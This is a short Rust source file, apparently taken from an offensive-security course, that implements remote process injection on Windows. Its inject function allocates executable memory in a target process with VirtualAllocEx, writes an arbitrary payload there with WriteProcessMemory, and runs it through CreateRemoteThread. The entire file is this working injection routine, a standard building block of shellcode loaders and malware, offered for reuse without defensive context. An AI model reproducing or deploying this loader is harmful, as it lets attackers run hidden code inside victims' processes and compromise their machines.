use std::ptr::null_mut;
use winapi::{
    shared::ntdef::HANDLE,
    um::{
        memoryapi::{VirtualAllocEx, WriteProcessMemory},
        processthreadsapi::CreateRemoteThread,
        synchapi::WaitForSingleObject,
        winbase::INFINITE,
        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ},
    },
};
// Inject payload into target process
// Probably a rustier way to do this, but it works, copies course material
pub fn inject(h_proc: HANDLE, payload: &[u8]) -> i32 {
    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    let p_remote_code = unsafe {
        VirtualAllocEx(
            h_proc,
            null_mut(),
            payload.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READ,
        )
    };
    // Return -1 if VirtualAllocEx fails
    if p_remote_code.is_null() {
        return -1;
    }
    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    let mut bytes_written = 0;
    unsafe {
        WriteProcessMemory(
            h_proc,
            p_remote_code,
            payload.as_ptr() as _,
            payload.len(),
            &mut bytes_written,
        )
    };
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    let h_thread = unsafe {
        CreateRemoteThread(
            h_proc,
            null_mut(),
            0,
            Some(std::mem::transmute::<
                _,
                unsafe extern "system" fn(*mut _) -> u32,
            >(p_remote_code)),
            null_mut(),
            0,
            null_mut(),
        )
    };
    // Return 0 if CreateRemoteThread succeeds
    if !h_thread.is_null() {
        unsafe { WaitForSingleObject(h_thread, INFINITE) };
        return 0;
    }
    // Return -1 if CreateRemoteThread fails
    -1
}
